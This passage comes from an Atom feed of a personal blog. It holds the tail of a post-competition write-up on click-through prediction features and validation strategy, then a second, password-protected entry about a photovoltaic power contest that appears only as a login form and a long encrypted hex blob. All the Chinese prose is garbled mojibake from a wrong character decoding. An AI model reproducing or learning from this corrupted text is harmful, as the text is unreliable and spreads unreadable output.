¹æ®è¿ç»­ä½¿ç”¨å°†ç”¨æˆ·çš„ä½¿ç”¨æ—¶é—´åˆ†æ®µï¼Œæ›å…‰æ—¶é—´é—´éš”å°‘äº3åˆ†é’Ÿçš„è§†ä¸ºåŒä¸€ä¸ªä½¿ç”¨æ—¶æ®µã€‚ç„¶åç»Ÿè®¡æ¯ä¸ªä½¿ç”¨æ—¶æ®µä¸­ä¸Šä¸€æ¬¡æ›å…‰æ—¶é—´å·®çš„ mean å’Œ std ç‰¹å¾ã€‚è¿˜ç»Ÿè®¡äº†æ¯ä¸ªç”¨æˆ·ä¸‹ä¸€æ¬¡æ›å…‰æ—¶é—´å·®çš„ meanï¼Œstdï¼Œmedianï¼Œskewã€‚é’ˆå¯¹æ›å…‰æ—¶é—´å·®çš„ç»Ÿè®¡å¯ä»¥ååº”ç”¨æˆ·å½“å‰ä½¿ç”¨æ—¶æ®µæˆ–è€…æ•´ä½“ä¸Šçš„è§†é¢‘è§‚çœ‹æ—¶é•¿ä¿¡æ¯ã€‚</p><p>æ­¤å¤–è¿˜æ„é€ äº†ç”¨æˆ·å¹³å‡æ¯å°æ—¶è¢«æ›å…‰å¤šå°‘è§†é¢‘ï¼Œè¯¥è§†é¢‘æ˜¯ä¸€å°æ—¶å†…è¢«æ›å…‰ç»™ç”¨æˆ·çš„ç¬¬å‡ ä¸ªè§†é¢‘ï¼Œä»Šæ—¥æ›å…‰ç»™ç”¨æˆ·çš„è§†é¢‘é‡ä¸æ˜¨æ—¥æ›å…‰ç»™ç”¨æˆ·çš„è§†é¢‘é‡çš„å·®å€¼ï¼Œæœªæ¥ä¸€å°æ—¶ç”¨æˆ·åœ¨è¯¥ç½‘ç»œç¯å¢ƒä¸‹çš„è§†é¢‘æ›å…‰æ•°é‡ã€‚</p><p>å½“ç„¶ä¹Ÿæœ‰è®¸å¤šå°è¯•åæ•ˆæœä¸å¥½çš„æ“ä½œï¼Œæ¯”å¦‚æ•°æ®é›†ç»™å‡ºäº†ç”¨æˆ·çš„è®¾å¤‡ä¿¡æ¯ï¼šè®¾å¤‡å‚å•†ï¼Œè®¾å¤‡ç‰ˆæœ¬ï¼Œå¯ä»¥æ•ˆä»¿<a href="https://www.logicjake.xyz/2020/02/06/%E7%A7%BB%E5%8A%A8%E5%B9%BF%E5%91%8A%E5%8F%8D%E6%AC%BA%E8%AF%88%E7%AE%97%E6%B3%95%E6%8C%91%E6%88%98%E8%B5%9B%E7%AE%97%E6%B3%95-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/">ç§‘å¤§è®¯é£åæ¬ºè¯ˆ</a>ä¸­çš„æ“ä½œï¼Œå¯¹å…¶è¿›è¡Œæ•°æ®å¤„ç†ï¼Œä½†å¯èƒ½ç”±äºè‡ªèº«é‡è¦æ€§å°±ä¸å¤§ï¼Œæ•°æ®å¤„ç†ä¹Ÿæ²¡å•¥ç”¨ã€‚å€ŸåŠ©ç™¾åº¦åœ°å›¾ api å¯ä»¥å°†æ•°æ®é›†ä¸­çš„ç»çº¬åº¦è½¬åŒ–æˆå…·ä½“çš„åŸå¸‚ï¼Œä¹Ÿæ²¡å•¥æ•ˆæœã€‚</p><h2 id="æ¨¡å‹"><a href="#æ¨¡å‹" class="headerlink" title="æ¨¡å‹"></a>æ¨¡å‹</h2><p>è¿™é¢˜ä¸»è¦æœ‰ä¸¤ç§å»ºæ¨¡æ–¹å¼ï¼Œä¸€ç§æ˜¯å¸¸è§„çš„äº”æŠ˜äº¤å‰éªŒè¯ï¼Œåœ¨åˆ’åˆ†æ¯æŠ˜æ•°æ®æ—¶ï¼ŒæŒ‰ day æ‰€å æ¯”ä¾‹åˆ’åˆ†æ¯”ä»¥æ˜¯å¦ç‚¹å‡»æ¯”ä¾‹åˆ’åˆ†è¦å¥½ï¼Œå¯ä»¥è®©æ¯æŠ˜æ¨¡å‹å­¦ä¹ åˆ°ä¸‰å¤©çš„æ•°æ®ï¼Œåšåˆ°æ—¶é—´ä¸ŠåŒåˆ†å¸ƒã€‚å¦ä¸€ç§æŒ‰æ—¶é—´åˆ’åˆ†ï¼Œçº¿ä¸‹ç”¨8ï¼Œ9ä¸¤å¤©çš„æ•°æ®åšè®­ç»ƒé›†ï¼Œ10å·æ•°æ®åšéªŒè¯é›†ï¼Œä¿ç•™æ¨¡å‹çš„æœ€ä¼˜è¿­ä»£æ¬¡æ•°ï¼Œç„¶åçº¿ä¸Šæ¨¡å‹ç”¨å®Œæ•´çš„ä¸‰å¤©æ•°æ®é¢„æµ‹æµ‹è¯•é›†ã€‚å¯¹æ¯”æ¥çœ‹ï¼Œç¬¬äºŒç§éªŒè¯é›†åˆ’åˆ†æ–¹å¼å’Œçº¿ä¸Šæ›´ä¸ºç›¸ä¼¼ï¼Œæ‰€ä»¥ä¸çº¿ä¸Šåˆ†æ•° gap è¾ƒå°ï¼Œè®­ç»ƒæ—¶é—´ä¹Ÿæ›´çŸ­ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸»è¦ä½¿ç”¨ç¬¬äºŒç§å»ºæ¨¡æ–¹å¼ã€‚ä½†ç¬¬ä¸€ç§å¯ä»¥å¾—åˆ°å…¨æ•°æ®é›†ä¸Šçš„ç‚¹å‡»æ¦‚ç‡ï¼Œå¯ä»¥ä½œä¸ºæ–°çš„ç‰¹å¾åŠ åˆ°æ•°æ®é›†ä¸­ï¼Œå¯ä»¥æå‡0.002-0.003ã€‚éœ€è¦æ³¨æ„çš„æ˜¯å‡å¦‚é‡‡ç”¨è¿™ç§æ–¹å¼é›†æˆï¼Œäº”æŠ˜æ¨¡å‹çš„å­¦ä¹ ç‡ä¸èƒ½å¤ªå°ï¼Œå¦åˆ™æ¨¡å‹æ•ˆæœè¶³å¤Ÿå¥½å¯¼è‡´æ¦‚ç‡å€¼ç‰¹å¾è¿‡å¼ºï¼Œä½¿å¾—æ—¶é—´åˆ’åˆ†æ¨¡å‹ç›´æ¥æ‹Ÿåˆæ¦‚ç‡å€¼ï¼Œè¿‡æ—©æ—©åœï¼Œæ— æ³•å­¦ä¹ å…¶ä»–ç‰¹å¾ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ä¸ªäººæ„Ÿè§‰ï¼Œå—é™äº APP çš„ç”¨æˆ·ä½“éªŒï¼Œå•çº¯çš„ç”¨æˆ·å±æ€§å¯¹é¢„æµ‹ä½œç”¨ä¸å¤§ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ app è¡¨å’Œ user æ— æ³•æ­£ç¡®æ‰“å¼€çš„åŸå› ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä»ç”¨æˆ·çš„è¡Œä¸ºæ•°æ®ï¼ˆä¹Ÿå°±æ˜¯ train è¡¨ï¼‰æ„é€ ç‰¹å¾ï¼Œä½†è¡Œä¸ºæ•°æ®ä¸­ä¹Ÿæœ‰å¤§é‡ä¸å¯ä¿¡æ“ä½œã€‚æœ‰äº›ç”¨æˆ·ä¸ºäº†å®Œæˆ APP çš„ä»»åŠ¡æ‹¿å¥–åŠ±ï¼Œä¼šéšæ„ç‚¹å‡»è§‚çœ‹è§†é¢‘ï¼Œè¿™éƒ¨åˆ†è¡Œä¸ºå®Œå…¨éšæœºï¼Œæ— æ³•ä»ä¸­æ­£ç¡®æç‚¼å‡ºç”¨æˆ·çš„å…´è¶£æ‰€åœ¨ï¼Œä¹Ÿå°±å¾ˆéš¾å»é¢„æµ‹æœªæ¥çš„ç‚¹å‡»è¡Œä¸ºã€‚ä½†ç”¨æˆ·è§‚çœ‹è§†é¢‘åçš„æ¨¡å¼æ˜¯å›ºå®šçš„ï¼Œè§†é¢‘çš„æ’­æ”¾æ—¶é—´æ˜¯å¿…å®šæœ‰çš„ï¼Œæ‰€ä»¥ ts çš„æ—¶é—´å·®æ˜¯å¯ä¿¡çš„ã€‚ç‚¹å‡»è§†é¢‘è¯¦æƒ…é¡µå‡ºç°çš„ç›¸å…³è§†é¢‘æ¨èä¹Ÿæ˜¯å¿…ç„¶å­˜åœ¨çš„ï¼ˆè¿™æ˜¯æˆ‘çŒœæµ‹çš„ï¼Œå¯èƒ½ä¸æ­£ç¡®ï¼‰ï¼Œæ‰€ä»¥ä¸‹ä¸€æ¬¡è§†é¢‘æ›å…‰çš„ pos ä¹Ÿæ˜¯å¯ä¿¡çš„ã€‚æ‰€ä»¥è¿™ä¸€é¢˜å¸¸è§„ç‰¹å¾å¹²ä¸è¿‡ç©¿è¶Šç‰¹å¾ï¼Œæ— æ³•è¿‡äºä¿¡ä»»ç”¨æˆ·è¡Œä¸ºï¼Œåªèƒ½ä¿¡ä»»æœºå™¨è¡Œä¸ºã€‚</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p><a href="https://www.turingtopia.com/models/details/notebook/b698f36b82f846e087cc349f91d0eba0" target="_blank" rel="noopener">æ¯”èµ›åˆæœŸ0.65å¼€æº</a><br><a href="https://www.turingtopia.com/models/details/notebook/417565783ede4251a7ef268019355259" target="_blank" rel="noopener">å¤©æ‰å„¿ç«¥0.81é«˜åˆ†å¼€æº</a><br><a href="https://www.turingtopia.com/models/details/notebook/d854d4fd5b4e401ca20e944c4b353cbd" target="_blank" rel="noopener">user è¡¨å¤„ç†æ–¹å¼å¼€æº</a><br><a href="https://www.bilibili.com/video/av78282108" target="_blank" rel="noopener">éº»å©†è±†è…è§†é¢‘è®²è§£</a></p>]]></content>
        <author>
            <name><![CDATA[LogicJakeâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2020/02/07/%E5%9B%BD%E8%83%BD%E6%97%A5%E6%96%B0%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%89%E4%BC%8F%E5%8A%9F%E7%8E%87%E9%A2%84%E6%B5%8B%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[å›½èƒ½æ—¥æ–°ç¬¬äºŒå±Šå…‰ä¼åŠŸç‡é¢„æµ‹èµ›-èµ›åæ€»ç»“]]></title>
        <updated>2020-04-21T13:42:03+08:00</updated>
        <link href="https://www.logicjake.xyz/2020/02/07/%E5%9B%BD%E8%83%BD%E6%97%A5%E6%96%B0%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%89%E4%BC%8F%E5%8A%9F%E7%8E%87%E9%A2%84%E6%B5%8B%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2020/02/07/%E5%9B%BD%E8%83%BD%E6%97%A5%E6%96%B0%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%89%E4%BC%8F%E5%8A%9F%E7%8E%87%E9%A2%84%E6%B5%8B%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="å¯†ç é”™è¯¯" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">è¾“å…¥å¯†ç </label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="9dd89417eb77692e7fd18886c7e9e4efa9435cddd62672584cfe786668a76610">e5eb025b9d453f6fe7ad941d9ee49e3724da413c36c94cb7ddb25597ce4317ee26b7155a25f84cc57e8914af67745b49ce9db3b35b4b9c02c7566164f1942a05fed6761b2ebabe974de19522e67a77de4245966c0f80ff66e73aaa9d44bed41f938a2552f1af2920c3b2754a2f7ab267230c10250ddbdadd01688dc846c27b852d4d1c60bd2058966e2d7193069e6d8ed27f00671cc24c6bf64d4b08c8d61a17cc2ee8a8a0c95adb0327d62aef0fb7135519155068f14883b2be19d8873c1de08f40d076987124e421e102efc053849cb4d77d4d46d37b97035406da6b585553b56dbea9943f744f333a83e981d8742eb54bd3c22af43926dc4ebc23dc3b39f5dadf2104fbe607cb7f78bb224adec9886368cf1e2891382d8c7231cf889387141cfe2b2af7a224114d7c24eca66eb64584b080050e3c7f76f5680b1c616dd507dd3472a83d593156aa3d32d4af97a04aac020cd14f21998e9a6a5383e882b44dfb58c5d1c035460bb77685871959d3e393a5bd2c8c81170e677f607794da8e77e6d275bcbe0d765ea24f53f93b1b2bcd62fe17b53bccd05402b2fb1344abb7fe3f0e5cff7fda297e85964109d67d5a459ef81d58053fba568bbfc546cfc0de68278ed31c53527bae03b57a3615692e1bd3735552e5292bafb3478a3cbe8e52ae0d4a384650b1059b49a13dbd48d63efe9d5253711e5cb2bd3fbfc940660d3091ce274e76ab5fbf1fea42ae90518be58aed20d5f4314f75261000cfdc4c31cecc8939890fa97e59150a0d9b08a593a15c44aa5a87b66a7c36c36cbab3cda356254d988746801d693e1e0cbf9edefb4865cabe6e139e654a916a2f6f0aa431f4adaf96913d5b1dbad60f0e8848e2462e440f472a2bf3a6f38b1def11636e1b774701b614c2a58e2ad6141a1de0a6308c043a82447c10f5950098a3dcd56994e568478c9bd8de986036bc7a593aa7e01f77441b49f4db1402ee1ad9d1b6e468cc740fd21b3ee25e8eb2de0c2ffd257f577625477ec4054b6aa8f3fa8d89e0443ce135d9e2da7968b08531914d27239333bc4849650df258da5cd726ac654b7ce68ccc754068dfa7e2b813ea976e03c0b31e83e62fb0d5e8c71db9f2a1a36f067921461ffd0d4347e99f3a050150a82959c3351caf1ddfe6c09909723fd6dfdaea76c5e8e12027cd731aa9369e808ac9f3d4031ea712f9bcbb19667ea2559e5eb13e97d96d7842fe25c2d130983cb1c90c2e184028234ec61b8318f9059f4c859f211e709187b5a5cfa5cb49a58cac19034f6117cf72c445c7cacfc9d67fd495ad7dc6745c072859d08c5fb11490fe1584fcdd58cf3f4bf5467fabca3922b783c9c4297aa381eaf8025fd29e2e5a2cd7c1dc29d54c479f5b3d501e730db8be09d57c084434aa3e7e4ba4a0db56df500538e7dd1c1db9cc1c166506adb78420d91af7a5c378cdca7573158292101bcfe5ed3ef2546421951eba41fa6ee0cf299d517ba5cd947167e6db65025d5d657b6d35fd825fda7701ca5b194ac6fb2430c4e361d93d0751250e37ae9ef9aa2c0bc04b9a15e107068b6da90fa62aa6b4bb1b03656c3336d5e3b288cb8f587d486ae7948d1e55da3e11420014aef05070903f3bba4493fa0c881ef59e262ba37e6d2aaacd08d10db590ae28b082341d4b2f1b9b78bcc56ec43a3b1855c092648c4f5705608249ded7b7f8c1284347add3f9c219e09798f2a5930fce82e86c087d4f859a6b2b87cb12b067a98436910f3e543b353b0080febdc9417e2d02280a62721b8459205600f1a2dc178c474aec5fb19e9f666795121668386e67142c5889a44a963d19b1b028ae2222a4ae7d08c53466521a45ace402b732b6e96121171f0cae37d50b1b775a2a647e2664976392096a588dd6acba61e659d34a25532cc0892498d6d9a7dc2328de76018406da0963c8a12df0c2658f56f36252e65f3c7a5110ad531e81b7686dc5f9ec0015672baca859ffe0b27965af7b4852b3ee9a6ab08970700c038e224a148a6a11bb7a337de2996729cbf80e40474e2334a7e9f2ec093472db464a1d2ca35356246e3af943830929c8534ffc694b8ccc3b0f5a24fa8bee3a9ff3b3e02762a60def05ba8896c44cc21b11dfe15e4ac5060dc04f4e95b0db2de3b14d985be2d6d2e4fcf1860dc5b431d045fe0dce5525436136e3239cd3e65cfb30efe3e1e49b2683e5ca62ce6d1117e39033a09c861ef9df3b61003925e80f4a5b02578be5919cfd51f2a95a8ddaf6a8c7e536c4379edd4e60c5bc31d958f6ec1047175766a3f6dd830e989cea1341350548f1fe9c3d29cd4b67cb3f2fe972f051cd7e9e2f6c477f9360ffa7eaf1b94f8eb0fd60a3675a948346417f17fc4093f43d5a56ad03905620150c381ebfb3688a1a8ac9714490f6cb56276f496b42834de86206d3a2ce450cc6cb4cddcf67ffb81238eebeaa59368ceedd64e2ff09d70271960c0b3d55235edba0b1799ad9f098c564414ea7ff98838391e8778697153cc9f50ffa0a9578bee04a8460035085dc26f2e1dbdb2b5d428d89cd59617d964f02b999c0f8a78151b7f8666556cc378e7d8004d68bdcf458632abb152f1b49f899bb1caf991b97abda281e61ef39809d4e74868e73accc24c282449f30c32eee042974d24207f187b8f98cf873dd886d42a5dafbe467baf45c62a8ba77aa6aac65bc9b994f414356b0bcf2a99db3f74d957c33aeb9dfc707e4ad3a484e908d9f2b234c197c6007e6b614d7251befe1641abc696a041b3656273974c0f5ecd13e9c4fafb832551ce4a91bc4ff31da775cb144fb17a6ee4d7b08d80354adcacc582963ee1531faca6e957fac1cfb110ca39e366f6e9e52c35866914d406e2b5cac8db252b77357e4a658c2960ba07e0fa80b92ad2078518cb959ef10ca491d5e8cf8ff6afac934754ec2dbc5746cd64593d717c5730700505554323a3d5ebaa57450cabe41ca55c75afb71d0de46b3bd4a1c31c78d912798df505b4fa61ab3dee12a2662340fbad9b9e824691a54a84870be247cd185f46aa925aa5df5b1f5a9b1b5276b804c78cb0ec81102556a0a9464b619c77a67b6146db7419c9de2a3d551654935ef8ecbbfbbd1773e92efc82bd3b9f4f2f9968219b0877e145816dfbde68801aebfae33f40e04c62fd59a25ef199f45b71584e40c6f93d8fc9e18d7fc184636d7f1840634829faf61599e3f92aaa611593613425cabd5cd514f08a5d314ac345014368e4ff9a61969dcea5207b6e26bfe545a03fc1f82748256c60630dccf1b501061a032cb801b52b1d57d107e5cb305dd379ad998b549b9802bed97afc3849a1cb2c2b3be84e886589c7d4ac2709c50336e4bedad8e0eede89bc0b7b50f67a05928d80dc1af1b25f9fb8621921a4b4c042beb00221cd18332e3a112a8ff4d196857d6416c531d2c1ba9392a28661e1a09f79811aefc8b5afbef2bb703cae3b34cf16bb48bc54b95ad08d699103a246b4fb22bb48a7c075b6c8fef5bb5882086b900624f034521ecf97d993127e42d56701d38d0a05d0f326d99be2720b7d79e1e46d4d21b995c5e0918bc2ebba4574db87b92bd3ed7a8f4c4312fef58a7d981c40f3fcf09f8fe3b04e865634453302f773bc3940548fa15f14cf3471a61f97f71c72cee61ae81140476c59a3ae3a8f6ee18ac3d39158077f90e61d5b4a2410151b9e18e49eaf0554c34046fdfb1f4f260766100ed39fa986eb938515e8f6e8ce374a2c2d1daf6bc6727afdb8b471ac32d1fd589b07955be2aa3507fa07b4d4e56bf3b0518d6c51a6d4fd456118726cc085fae2d216220d47d1d78350cac3f4ffdb2e155217a4e1c8d3cc3c281e5b9d4cc09e69d0e8f4d3ae09f22ef4db2644069516a3ba1e80c1abd9912203ffeb09fb87b82928a5adb3e61dca8cc8aa6077cf5283433babf62d8c792227ae4e0454527c3a20cbc7539c368d2c2800e9992eac89ad2fb78f651b1cd9c1b605b46663cd19587f89642c7d1577b9a84bd5045336ba4a241c4f81aa2c56cd13c0e95b949f1e8f171499eba618d74a5a9a77a82ed4cd9793c46eef5a0990d071f8e6eb79781f32f6154d34df9d73700d9418cf305dead5532ed9fe1898190b37ed0ab4b2e1e07bd373669e01ba9de0fcf4f4207b31fc8c2b32367305307c659413997eaaae3dd95a19bc38ecb7b3b2056b4f688b3354445e3c4545acdf7eba976b55b77dbf2ba2f4e307dedd5b152b87f4f7259963224b9d965abcd34a1aed0800e05eb23288c3347dac1d30d8eeb145ca2a9ae2098b6af7581c7160b50c28b7f90ecc96e1c69b74fa7d58a08851b7d17fdbce86185846991a1b3cb8294319f3a6a9a1ca033ec45a691f6a05608810b3eccb7a178928c3d717ba70f93e2a8d25cb4e8b9cdbb2effa4ac7d025bcf317dfddf9495bf9c7f124dc3b756a9bf083d1a6163292f56c08dc762baae11e962c0e3b8b8033c2fd96b4b4bbe017fa14e5299b334d09044136bae989a688dd73eddea15b1cd5f5959ab71d0663afe8632b2781003fdbeef5c78c4591af3a8aad6410011cc0270e913431675f1733469a9e2fddd4375764964719bcc8d805dd80098c214fd6b3686a5fc5d82d080f89e0815431ccff322f88b8fdca8f4d6ea6df8d0e831f3636f6b9053074f1e122eee04d565564d0b5ac3f48d690eb8b5bc6643be3aad0af56d9c48a0259a0b688ce4754649b09e862139debf011c82377a27d5250d2b6afd49663c87fb514d177372aee4762ce87f06e6b88840faa36312121765da76028e20011a064ebe7634b9fe5993935adf42329b3853284fd534d9089ee1b125688ac1bab595ef8ed9ca34be9a027264c092afb163b7e68736b0ad794cd7d43e12603ac5cecc6fce17117473895c2aa6636ad2c75f2f52c2f742efef52eccb286bf45b3caf4a43aa981949c38d96373008f8ce3705760a8b20f54c4962103b86a0dc8f3fffc57f4cc39f146513aa25a7223feefb4c5c3ae9fd0cbebb4d35b83d33ac687e3e0754f47583566f26f002496bae744457ebac7c39126c935378225a341454e34e44fdb3764658a44f4e2e0e2a6e304174bf307a909a27214fbad1c00049fae54a8de9a1855d84cb219247e32d4013552d2a1fae1fb1410e741d0cf8fe9d8ab12cdcda5587f7f57e98029139c52830e1fc2f9bb10441a87aeaadaf82fa7e05aef97b0991e6eccad20f3df1a06ec1db82e7d95e5d0842d33cfb4d9534ca19a77edc0621b9f84a42b2c50af685d44edac9658a753085652b4e08479f544ef51a45ca80af08787b20a0ff30bfa9049c4418f97a400b487d1554caaea1e6b05593dea394d5e8ee5c03dac0d941dc15101b3bd95f82af8d1203e9085e14feccecc193a2b4e1081a02d3a63cc8fc51b0e624d78e2c8040fc8f64fca269cf405526e0a4312fa94f54aba69bcea466026c5d6389dcde46da6f640cde148257bf96f6fd6826217a1edb6ba1ca8f35a27bc23d50d1bd7132666c4ec2267ad8814bd7e09bf3ffdeaca14b7d4396fc4cc94096192b9200d2ef704c9dd843ee60230c40bf3a7f2982b9a96ae2ec2d00191a991054c7a8920a3e01d868e5a3ae74593f6d4251cdea1f7f97d9d9d88f63b727586e860040dd09ab4e5ceb1a3870f54e5d883726af65e9d4341e9c287da590ed95749ad798ba224d020af5615679cd5a3926a7056f2b6f7dcf1e60e96ddb8f2f9b100067bff1bf2d184999cd5e0b38f9213eabac40902d75d250e39038816ddddfdef2758e8448837607dc3ef479256491af5a4f64d08c0a270f8e94856f38807460ea3872229acdf793b194a69530c9d3bf914a5f197cb8b163fc49d5492e581dacd5a949222eeae8a62afd87bf2588b2b661d7469a598e235545df6b8716dc4adc51368dac3afc26e49c15e42625cdd270c5f6c6db307db5884f02ab37a0d0e94a19bacf8c72b3a66819fab1440e2c64b2de7aaccc92bcbf5beeca330c6f450aa2bc9dd4a48a30d04a3817a38a897fc472608a59ab48eb0878cf9ee12dd0af4108656db6c67d697211bb9fc6c3a2cdd353635b34d0baa966b1ee1523c08bbcf41d0327a13372471c5f5d578016e7a6b41829955fe2b19f962a685b246d91243cfefc0c0a9b5ee49519b0fda8c126028d4baaf046f75c5a5d904a03d118a20f63ce17c617e156df0ca2837daae048e7a1b09ff5222fa7336414756bf7fa151f6323216b8de01b9d520d8924227d2d2916d2465ec789e1411bd666fd16d9676ca4c525e18120bff2341bbe2aae12811d73e546af021c3eb512d1899cb367502857174bb570d5c62929b0a2490d0d3968c11ca17b299abf267ba4247b30ec54d413d8bf63f59908e5408d7f8d669a7cca4772e331eed39bc8cc53cd1b24198fa04e801e056a3ab97e98349ee43aa774a5638bbc656ddc31a34dc6d1fc6d86d52525fce25e3f97c9403200dd433b83adf038b3d9bcfafb1fa2bb6c1d8a6919ea8873e0a8de83de87c2c125b17b5d2e3c955997bd81b45a29e89f2d37b5560f47b664379938056f45b22bc5f587d4933c6a2dfe33b7f8cfb18f08b33fbfa08ac51da5f5362050899b7647a5cc039b0bc3db90a8c722ceeb72b038302ef88102d4fa5f2a03c030917b5006a77e55cb64cb219d174eb344030fc9ef344e855a075fe24807faad05f144195f9cb2dfcbd81e9d6fb0f7f18177e7e46db14bfdb1820413c72388881974bb1284965951f37f91e6ae3ac837c6f78d5c173f9ab54b4c67f6b1fe841fc001d6746d209a659787d8bb6f127a822e3d4d8b2bc36e2a7b800d5169c0c467e36df038185dae2f9191baccc4e90a9ce57d4e12e067ccabc090726a460269014b13ed30a9dc30b3f41182887fc6d083db4750203d09ef508b361cd6708475cb0d82df9e275614214fd9020d6dad6ed4ef9a8c16695797838a16785e2b33abf5133c9384fa2f248074f7e6996f9a7a2b8402f81e1d312125c08d0e9dace40ccb2b2875ba2f040c9a6988f07182ad036c4a82e99070b606e256338495d81b87e90999ea668187cb3746b47c6569936f2daf2701f4e62fe79442412ab0a6f31bf3a0b90c2fd144b03b89dcdc7f5fc0a8036318c20a68c8c1b55314dcb8447141c233017885eb0117546fbbb794dcb5c5bc0521042747c113b7e88acd29b7a25fa3b4fb30c734056ba3570e706bd6611e6ef4ed1f17930ee40c38078b376ac3d182e4a38fba06e5cf604c69d47c7224ef65e7cd8e8b17aca044efde7d873d234525adbb17e394039d5d8bbce42578812a81941fe05e94bc228fd13230642e90458b88a66302ed7d24a67c58e900bb16bc2c3d3fcdc2bde46bf55c25b07cf69057ba48a0313ed4dc5f3e71f0c74aadb89faf6e4a464262913ecfbb61ee974796fa2ed6c736d4a48b573e7a51f02e380df6dc9341d93de7beaef7d5c11b94180ba3933eba357230e11e0141c10bdb93e39a100a207cf437fcd3a01fca80ff3b1a00f2ff91dde95e667240dcccd76d768a587bcc1c61de263414571e85e5c84d41ca1dcca5223cae13cee20af00c21579e8832977c48692cd917a004b28911d820bfc43a0365b048d5a480095bb5c10ed1f613cd4ac81784f150617f488ef39260de0a2c9a1dfdf3f050458364cf6af304862bfe7bc15b4bcd084ffecd9a657291d936224cc6062cd167a955795bbc75f1c2b570befed33b4ded7654e45ff2fb847e1fe7b4b20602317e0adcb3ee7298d36626432a212e07d4ec82af5bd84487cc991085781b987b19d9c143a03d5f2c30bb4c6a295c3a81e8b0a456e77b565fdd0f2becc1a6fdefc541b2c807b2de4057883fd3001a60335704b504ef5043656c208e79bd08577ff5f1e7239a75ac1e72983f2e4d4de377832f1af17e4d25bedddb7fd8dc20c837da4d7d70903b94d9adf015f130b50dc84baa88119b2a8559920562315b7bceb65d467d1a15f56216e26f107bc8b19cad33c0c6ca1db8b1b11a0f431d78b0fcfcb26524ffc296aab5fb456f2410aa44cc9a162edffc314d935af612b015d3fdd7f0190a2509ef884f71e5caf7eb49c6a737273eac8f32707b51f92bcb4647ee63529e5f7dfae21c2b4695cb99fcc5956b53c19c0dcfb9d77494a7d743caae1b0435419126280e3d282e819726927e58533aaabcd3e1bcba20c4c78432c47d582cb655a932562f96e77c47773e2c5abdf4964c1011cdbae436b6a4bc39290eeb42bfc3b5de2f5397499f08dfbb314451e058bffef9c1cef277d6b2818b7a82fcb55b2344f4f23870e5c1fbdec7a26c7120cecd60d246a199cb81fa12f4404f095a434eadcbc185dfae6ee9f5a29f8b30ca2fb2068522c6e64751465f95e865bef47bb3f2fbd1198e703319818593140af9ad1cb8e092a2e10769235be7aba087882f68eeff1ceeaed7e4aeef5bad0d628e45ae64e8d37d8a727b4e24c26f880949df8c6171fc92077a33b490062981dd3ee4b5fc2115a49f7987b433d4829034d2f2f8cc37fabfc4491befef6572b0be572d70e2ac3465c46eac6c42056b6a51c07063c7d9970069dc4e5e37fa5907ee42a2fd192c0e1f4c932642c71c04c1968eb397af3e69f9ed4690bad39d06f3a89d87514e7aca1c5c2028e6213c0d0879a43294ef3a4e98897f7c388720a3e8fa746e598f44a496b9f2de7efcb992243d6fc578c2b95dc3f6769fe0d6a1520e819fa49be59e2a2b50f86c17c5c79f2282e5154d4e227e267b16e5c9110a3f870af0e6b4e19a98ed8f867ab2e9b789bc403a5b8c4c899f0336194f9d4168b224bc13e5513c0a4c1722109b83109dfea2482146fbdd04be6d77ba40e7217e0bed4ec3de96d9b41f07ef13a08b115f6b780992eb1a79674cf19a23248cb7cdcd3623c91f1e29df4a7f48c3f564dde7484741488d8bcc112afb565f5c807e79b0a9d82c3873e4222d73a1095f385205b6ef20c23873ec02b09e6d663e62e9735b9653c277233d9e336e6559c406314d2e2c241ce047378fc90f39e4f132c459f088f3433c2b892bbbdbf3a055bc06136a799b218fb3d61f4d2843a5ccd7c97b068d4c2173748440a3c1ba4494fc99dd665f23e7f002aac3aa26049fb4b2e151aa8e72d65377aa90e17c5020ecd96674b43c9ddfbe9bbe1057f6577907aa86b793294491d59fabed1b1160c76fc20cd4d9b155cdf935be8bbbc98eb75f89050fb504cbd60985c46383bff07bca420c19e5f3b3ae535cf7c3864fa22168a877372c46d668e247ba4a801ba763172a9809f6b4bc9fe8c2fcf6d1737ebc41310cfdb598bac1105315c4ba4c456d08e0d635c438da338d67d8249e2f5056088a6724e5ac887308b6402a060bc8c5f821df2d3437a6b999aca4a82d7366d299c3701c6254a62c86dcc56f3372cc38a3f543f83153aa5fafe681d94d5ecbe7ef305faf750443be8fc12f1be64af4b15ef647e9ecf57822414832eca378bff8a88d3736645cd5b7daa72a39e42ae876fa779751711a33b2ab82f61a14d29341df3565dd634d7372fc285c9805f4603813b9b212a2fe4aac7f21b341d721b56eff2ecbf7a051c0e8ccc6e6294ce4cc2de992e174cc62ebb4bce1c630acb692dfdf938270ad7b94c8fa24fac2cfd57e39274af3a3183aadfbb4c57441611a419543d9f47c301cd8383b7bc4ee171b54306966aab037b2331872220ef3c1d592816fb216751b1b41e07cf12186735e8462966c32edd4851a6bc92f536fd3ff99340aada312c9900b3f93405a073aaa539833a3d9c86db4615525a20d0abd548730deb664d342111b2b24c8242d525ca154e59c1bbade369c208e8fd740899e4f1fc929e592b1c4025f94428da58642e107970143c19036492dc790d175c5ffb3b08b874b26e3c9ff75278b5dd910cb8c133951ca5f96156666530a4c26ebed263fbda8d7e0f46c073e2c19a27d91c583025e7859175286f2b762140bcf4a8f463436e86bb06a1e8238a7a9e8a3b4ce241e4b859765478fcaeb4f7